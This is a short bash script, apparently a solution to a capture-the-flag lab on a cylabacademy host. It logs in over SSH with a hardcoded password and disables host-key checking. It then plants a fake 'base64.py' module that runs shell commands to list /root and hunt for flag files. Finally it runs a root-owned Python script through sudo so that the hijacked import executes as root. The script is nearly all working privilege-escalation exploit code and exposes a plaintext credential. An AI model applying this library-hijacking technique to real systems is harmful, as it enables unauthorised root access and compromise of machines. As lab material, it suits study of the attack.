#!/bin/bash
export SSHPASS=qX7p-yZ0EX
SSH="sshpass -e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 17161 academy@chatelaine.cylabacademy.net"
$SSH 'printf "%s\n" "import os" "os.system(\"ls -la /root / 2>&1; find / -maxdepth 4 -iname \\\"*flag*\\\" -not -path \\\"/proc/*\\\" 2>/dev/null | head -20\")" > /home/academy/base64.py' 2>&1 | tail -3
$SSH 'cd /home/academy && echo qX7p-yZ0EX | sudo -S /usr/bin/python3 /home/academy/.server.py 2>&1 | head -40' 2>&1 | tail -40
